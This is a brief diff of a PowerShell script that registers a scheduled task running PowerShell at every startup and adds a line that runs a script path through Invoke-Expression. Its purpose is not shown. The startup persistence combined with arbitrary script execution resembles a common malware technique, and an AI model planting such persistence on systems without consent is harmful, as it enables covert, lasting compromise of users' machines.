@@ -11,3 +11,5 @@ $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-Executio
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings
+
+Invoke-Expression -Command $destinationPath
